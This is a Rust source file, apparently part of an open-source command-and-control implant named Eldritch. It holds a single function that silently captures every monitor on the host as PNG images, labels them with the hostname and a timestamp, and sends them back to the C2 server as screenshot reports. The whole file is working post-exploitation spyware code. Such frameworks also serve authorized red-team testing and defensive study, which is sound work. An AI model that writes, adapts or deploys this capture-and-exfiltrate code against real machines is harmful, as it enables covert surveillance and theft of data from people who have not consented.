use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use alloc::format;
use eldritch_agent::{Agent, Context};
use pb::c2::report_file_request;
use pb::{c2, eldritch};
use xcap::Monitor;
use std::io::Cursor;
use image::ImageOutputFormat;

pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
    let monitors = Monitor::all().map_err(|e| e.to_string())?;

    if monitors.is_empty() {
        return Err("No monitors found".to_string());
    }

    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string());

    let now = chrono::Local::now();
    let timestamp = now.format("%Y%m%d%H%M%S");

    for (i, monitor) in monitors.iter().enumerate() {
        let image = monitor.capture_image().map_err(|e| e.to_string())?;

        // Convert to PNG in memory
        let mut buffer = Cursor::new(Vec::new());
        image.write_to(&mut buffer, ImageOutputFormat::Png)
            .map_err(|e| e.to_string())?;

        let content = buffer.into_inner();

        let filename = format!("screenshot_{}_{}_{}.png", hostname, timestamp, i);

        let metadata = eldritch::FileMetadata {
            path: filename.clone(),
            size: content.len() as u64,
            ..Default::default()
        };

        let file_msg = eldritch::File {
            metadata: Some(metadata),
            chunk: content,
        };

        let context_val = match &context {
            Context::Task(tc) => Some(report_file_request::Context::TaskContext(tc.clone())),
            Context::ShellTask(stc) => Some(report_file_request::Context::ShellTaskContext(stc.clone())),
        };

        let req = c2::ReportFileRequest {
            context: context_val,
            chunk: Some(file_msg),
            kind: c2::ReportFileKind::Screenshot as i32,
        };

        agent.report_file(req).map_err(|e| e.to_string())?;
    }

    Ok(())
}
